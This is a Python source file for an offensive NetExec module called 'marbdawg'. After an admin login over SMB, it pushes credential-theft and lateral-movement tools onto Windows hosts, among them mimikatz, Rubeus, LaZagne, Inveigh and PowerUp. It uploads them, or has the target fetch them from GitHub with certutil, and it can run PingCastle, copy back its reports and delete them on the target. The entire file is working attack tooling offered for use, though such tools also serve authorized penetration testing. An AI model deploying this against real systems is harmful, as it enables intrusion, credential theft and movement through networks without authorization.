#!/usr/bin/env python3
# -*- coding: utf-8 -*-  # noqa: UP009

import os
import requests
from sys import exit

class NXCModule:
    """SHOW THEM WHO THE MARBDAWG IS!!!"""
    name = "marbdawg"
    description = "Deploy marbdawg power"
    supported_protocols = ["smb"]
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        """
        LOCAL           Enable/Disable Local Mode (True/False; default: True)
        MODE            Deployment mode (custom, all, enum, exploit, pingcastle; default: all)
        DIR             Remote directory for tool transfer (default: C:\\Windows\\Tasks\\)
        OVERWRITE       Overwrite existing files on target (True/False; default: False)
        CUSTOM          Custom tools (file path, directory, or comma-separated URLs)

        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum DIR=C:/Windows/Temp/
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=pingcastle
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=/path/to/tools/
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=/path/to/agent.exe
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=pingcastle OVERWRITE=True
        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o LOCAL=False MODE=exploit
            """
        self.LOCAL = module_options.get("LOCAL", "True")
        self.MODE = module_options.get("MODE", "all").lower()
        self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\")
        self.overwrite = module_options.get("OVERWRITE", "False").lower()
        custom_tools = module_options.get("CUSTOM", "")
        if isinstance(custom_tools, str):
            self.custom_tools = custom_tools.split(",") if custom_tools else []
        elif isinstance(custom_tools, list):
            self.custom_tools = custom_tools
        else:
            self.custom_tools = []

        if self.custom_tools and self.MODE != "custom":
            context.log.fail("CUSTOM provided but MODE is not set to 'custom'.")
            exit(1)

    def on_admin_login(self, context, connection):
        """Execute the selected technique upon admin login."""
        self.LOCAL = self.LOCAL.lower() == "true"
        self.overwrite = self.overwrite == "true"
        if not self.location.endswith("\\"):
            self.location += "\\"

        if self.MODE == "custom":
            self.deploy_custom_tools(context, connection, self.custom_tools)
        elif self.LOCAL:
            self.handle_local_mode(context, connection)
        elif self.MODE == "all":
            self.install_all(context, connection)
        elif self.MODE == "enum":
            self.deploy_enum_tools(context, connection)
        elif self.MODE == "exploit":
            self.deploy_exploit_tools(context, connection)
        elif self.MODE == "pingcastle":
            self.deploy_pingcastle(context, connection)
        else:
            context.log.fail(f"Invalid MODE: {self.MODE}")

    def handle_local_mode(self, context, connection):
        """Handles the `local` mode for downloading tools locally and serving them via SMB."""
        context.log.highlight("Running in local mode...")
        tools = self.get_tools_based_on_mode()
        filenames = [tool.split("/")[-1] for tool in tools]

        # Create local directory
        local_dir = "local_tools"
        os.makedirs(local_dir, exist_ok=True)

        # Download tools locally
        context.log.highlight("Downloading tools locally...")
        for tool in tools:
            filename = tool.split("/")[-1]
            filepath = os.path.join(local_dir, filename)

            if os.path.exists(filepath):
                context.log.highlight(f"{filename} already exists in {local_dir}, skipping download.")
                continue

            context.log.highlight(f"Downloading {tool}...")
            response = requests.get(tool)
            with open(filepath, "wb") as f:
                f.write(response.content)
            context.log.highlight(f"Saved {filename} to {local_dir}.")

        # Upload tools via SMB
        context.log.highlight("Uploading tools via SMB...")
        for filename in filenames:
            file_path = os.path.join(local_dir, filename)
            remote_path = f"{self.location}{filename}".replace("/", "\\")

            # Check if the tool already exists on the target
            check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} already exists.) else (echo {filename} not found.)"'
            output = connection.execute(check_command, True)
            if f"{filename} already exists." in output and not self.overwrite:
                context.log.highlight(f"{filename} already exists on the target, skipping upload.")
                continue

            context.log.highlight(f"Transferring {remote_path}")
            try:
                with open(file_path, "rb") as file_stream:
                    connection.conn.putFile("C$", remote_path.replace("C:\\", ""), file_stream.read)
                context.log.highlight(f"Successfully uploaded {filename} to {remote_path} on the target.")
            except Exception as e:
                context.log.fail(f"Failed to upload {filename}: {e}")

        # Handle PingCastle execution
        if self.MODE == "pingcastle":
            self.execute_and_transfer_pingcastle(context, connection)

    def execute_and_transfer_pingcastle(self, context, connection):
        """Executes PingCastle and transfers HTML and XML reports to the local system."""
        tools = self.get_tools_based_on_mode("pingcastle")
        zip_file = tools[0].split("/")[-1]
        exe_path = f"{self.location}PingCastle.exe"

        # Check if PingCastle.exe is already unzipped
        check_command = f'cmd.exe /c "if exist {exe_path} (echo PingCastle already exists.) else (echo PingCastle not found.)"'
        output = connection.execute(check_command, True)
        pingcastle_exists = "already exists" in output

        if not pingcastle_exists:
            # Unzip PingCastle
            unzip_command = (
                f'powershell -Command "Expand-Archive -Path \'{self.location}{zip_file}\' -DestinationPath \'{self.location}\' -Force"'
            )
            context.log.debug(f"Unzipping {zip_file}...")
            output = connection.execute(unzip_command, True)
            if "exception" not in output.lower():
                context.log.debug(f"Successfully unzipped {zip_file}.")
            else:
                context.log.fail(f"Failed to unzip {zip_file}. Output: {output}")

        # Run PingCastle
        context.log.highlight(f"Running PingCastle from {exe_path}...")
        run_command = f"cmd.exe /c {exe_path} --healthcheck"
        try:
            output = connection.execute(run_command, True)
            context.log.highlight(output)
        except Exception as e:
            context.log.fail(f"Failed to execute PingCastle: {e}")

        # Transfer HTML and XML reports to local directory
        local_dir = "./pingcastle_reports/"
        os.makedirs(local_dir, exist_ok=True)

        context.log.debug("Listing PingCastle reports on the target...")
        try:
            reports = connection.conn.listPath("\\C$", "*")
            html_reports = [report for report in reports if report._SharedFile__shortname.endswith(".html")]
            xml_reports = [report for report in reports if report._SharedFile__shortname.endswith(".xml")]

            for report in html_reports + xml_reports:
                if report.is_directory():
                    continue
                report_filename = report._SharedFile__shortname
                remote_path = f"C:\\{report_filename}"
                local_path = os.path.join(local_dir, report_filename)

                context.log.debug(f"Downloading {report_filename} to {local_dir}...")
                with open(local_path, "wb+") as file_stream:
                    connection.conn.getFile("\\C$", report_filename, file_stream.write)

                context.log.display(f"Successfully transferred {report_filename} to {local_path}.")

                delete_command = f'cmd.exe /c "del {remote_path}"'
                connection.execute(delete_command, True)
                context.log.debug(f"Deleted {report_filename} from C:\\")
                context.log.highlight(f"You can find the reports in {local_dir}.")
        except Exception as e:
            context.log.fail(f"Failed to transfer reports: {e}")

    def get_tools_based_on_mode(self, mode=None):
        """Returns the list of tools based on the selected mode."""
        mode = mode or self.MODE 
        tools = {
            "enum": [
                "https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1",
                "https://github.com/peass-ng/PEASS-ng/releases/download/20241201-e3889b61/winPEASx64.exe",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/CertificateAbuse/Certify.exe",
                "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
            ],
            "exploit": [
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Rubeus.exe",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/LateralMovement/Whisker.exe",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/PowerUp.ps1",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Inveigh.ps1",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Scripts/Powermad.ps1",
                "https://github.com/jakobfriedl/precompiled-binaries/raw/refs/heads/main/Credentials/mimikatz.exe",
            ],
            "pingcastle": [
                "https://github.com/vletoux/pingcastle/releases/download/3.3.0.1/PingCastle_3.3.0.1.zip"
            ],
            "all": [],
            "custom": self.custom_tools
        }
        all_tools_set = set()
        all_tools_set.update(tools["enum"])
        all_tools_set.update(tools["exploit"])
        tools["all"] = list(all_tools_set)
        return tools.get(mode, ValueError(f"Invalid mode: {mode}"))

    def install_all(self, context, connection):
        """Install all tools."""
        context.log.highlight("Installing all tools...")
        self.deploy_enum_tools(context, connection)
        self.deploy_exploit_tools(context, connection)
        self.deploy_pingcastle(context, connection)
        if self.custom_tools:
            self.deploy_custom_tools(context, connection, self.custom_tools)

    def deploy_enum_tools(self, context, connection):
        """Deploy enumeration tools."""
        context.log.highlight("Deploying enumeration tools...")
        tools = self.get_tools_based_on_mode("enum")
        self.download_tools(context, connection, tools)

    def deploy_exploit_tools(self, context, connection):
        """Deploy exploitation tools."""
        context.log.highlight("Deploying exploitation tools...")
        tools = self.get_tools_based_on_mode("exploit")
        self.download_tools(context, connection, tools)

    def deploy_pingcastle(self, context, connection):
        """Deploy PingCastle."""
        context.log.highlight("Deploying PingCastle...")
        exe_path = f"{self.location}PingCastle.exe"
        check_command = f"cmd.exe /c if exist {exe_path} (echo PingCastle already exists.) else (echo PingCastle not found.)"
        output = connection.execute(check_command, True)
        pingcastle_exists = "already exists" in output

        if not pingcastle_exists:
            # Step 1: Download PingCastle
            tools = self.get_tools_based_on_mode("pingcastle")
            self.download_tools(context, connection, tools)

            # Step 2: Unzip PingCastle
            zip_file = tools[0].split("/")[-1]
            unzip_command = (
                f'powershell -Command "Expand-Archive -Path \'{self.location}{zip_file}\' -DestinationPath \'{self.location}\' -Force"'
            )
            context.log.highlight(f"Unzipping {zip_file}...")
            output = connection.execute(unzip_command, True)
            if "exception" not in output.lower():
                context.log.highlight(f"Successfully unzipped {zip_file}.")
            else:
                context.log.fail(f"Failed to unzip {zip_file}. Output: {output}")

        # Step 3: Run PingCastle
        context.log.highlight(f"Running PingCastle from {exe_path}...")
        run_command = f"cmd.exe /c {exe_path} --healthcheck "
        output = connection.execute(run_command, True)
        context.log.highlight(output)
        
        # Step 4: Transfer results to local directory
        local_dir = "./pingcastle_reports/"
        os.makedirs(local_dir, exist_ok=True)

        context.log.highlight("Listing PingCastle reports on the target...")
        try:
            reports = connection.conn.listPath("\\C$", f"{self.location[3:]}*.html")
            for report in reports:
                if report.is_directory():
                    continue

                report_filename = report.filename
                remote_path = f"{self.location[3:]}\\{report_filename}"
                local_path = os.path.join(local_dir, report_filename)

                context.log.highlight(f"Downloading {report_filename} to {local_dir}...")
                with open(local_path, "wb") as file_stream:
                    connection.conn.getFile("\\C$", remote_path, file_stream.write)

                context.log.highlight(f"Successfully transferred {report_filename} to {local_path}.")

                delete_command = f'cmd.exe /c "del {remote_path}"'
                connection.execute(delete_command, True)
                context.log.highlight(f"Deleted {report_filename} from C:\\")
        except Exception as e:
            context.log.fail(f"Failed to transfer reports: {e}")

    def deploy_custom_tools(self, context, connection, custom_tools):
        """
        If custom_tools points to a local directory, transfer all its files directly.
        If custom_tools points to a single file, transfer that file.
        Otherwise, assume they are URLs and download them first.
        """
        context.log.highlight("Deploying custom tools...")

        # If there's exactly one argument, check if it's a file or directory
        if len(custom_tools) == 1:
            path = custom_tools[0]
            if os.path.isdir(path):
                context.log.highlight(f"Transferring all files directly from {path}...")
                for root, _, files in os.walk(path):
                    for filename in files:
                        local_path = os.path.join(root, filename)
                        remote_path = f"{self.location}{filename}".replace("/", "\\")
                        
                        # Check if the file exists on the target
                        check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} exists) else (echo {filename} not found)"'
                        output = connection.execute(check_command, True)
                        
                        if "exists" in output and not self.overwrite:
                            context.log.highlight(f"{filename} already exists on target, skipping upload.")
                            continue

                        context.log.highlight(f"Transferring {local_path} to {remote_path}...")
                        try:
                            with open(local_path, "rb") as file_stream:
                                connection.conn.putFile(
                                    "C$",
                                    remote_path.replace("C:\\", ""),
                                    file_stream.read
                                )
                            context.log.highlight(f"Successfully transferred {filename} to {remote_path} on the target.")
                        except Exception as e:
                            context.log.fail(f"Failed to transfer {filename}: {e}")
            elif os.path.isfile(path):
                filename = os.path.basename(path)
                remote_path = f"{self.location}{filename}".replace("/", "\\")
                
                # Check if the file exists on the target
                check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} exists) else (echo {filename} not found)"'
                output = connection.execute(check_command, True)
                
                if "exists" in output and not self.overwrite:
                    context.log.highlight(f"{filename} already exists on target, skipping upload.")
                else:
                    context.log.highlight(f"Transferring single file {path} to {remote_path}...")
                    try:
                        with open(path, "rb") as file_stream:
                            connection.conn.putFile(
                                "C$",
                                remote_path.replace("C:\\", ""),
                                file_stream.read
                            )
                        context.log.highlight(f"Successfully transferred {filename} to {remote_path} on the target.")
                    except Exception as e:
                        context.log.fail(f"Failed to transfer {filename}: {e}")
            else:
                # Otherwise, assume we have one URL
                self._download_and_display(context, connection, [path])
        else:
            # If multiple items are passed, assume they are URLs
            self._download_and_display(context, connection, custom_tools)

    def _download_and_display(self, context, connection, urls):
        """Download each URL locally and indicate success/failure."""
        for tool_url in urls:
            try:
                tool_name = tool_url.split("/")[-1]
                local_path = os.path.join("./custom_tools/", tool_name)
                os.makedirs(os.path.dirname(local_path), exist_ok=True)
                
                context.log.debug(f"Downloading {tool_name} from {tool_url}...")
                response = requests.get(tool_url)
                with open(local_path, "wb") as file:
                    file.write(response.content)
                
                # Check if the file exists on the target
                remote_path = f"{self.location}{tool_name}".replace("/", "\\")
                check_command = f'cmd.exe /c "if exist {remote_path} (echo {tool_name} exists) else (echo {tool_name} not found)"'
                output = connection.execute(check_command, True)
                
                if "exists" in output and not self.overwrite:
                    context.log.highlight(f"{tool_name} already exists on target, skipping upload.")
                    continue

                context.log.highlight(f"Transferring {local_path} to {remote_path}...")
                with open(local_path, "rb") as file_stream:
                    connection.conn.putFile(
                        "C$",
                        remote_path.replace("C:\\", ""),
                        file_stream.read
                    )
                context.log.highlight(f"Successfully transferred {tool_name} to {remote_path} on the target.")
            except Exception as e:
                context.log.fail(f"Failed to transfer {tool_url}: {e}")

    def download_tools(self, context, connection, tools):
        """Helper function to download and save tools to the target system."""
        for tool in tools:
            filename = tool.split("/")[-1]
            destination = f"{self.location}{filename}"
            context.log.highlight(f"Downloading {tool} to {destination}...")
            command = f'cmd.exe /c certutil -urlcache -split -f "{tool}" "{destination}"'
            output = connection.execute(command, True)
            if "successfully" in output.lower():
                context.log.highlight(f"Successfully downloaded {filename} to {destination}.")
            else:
                context.log.fail(f"Failed to download {filename}. Output: {output}")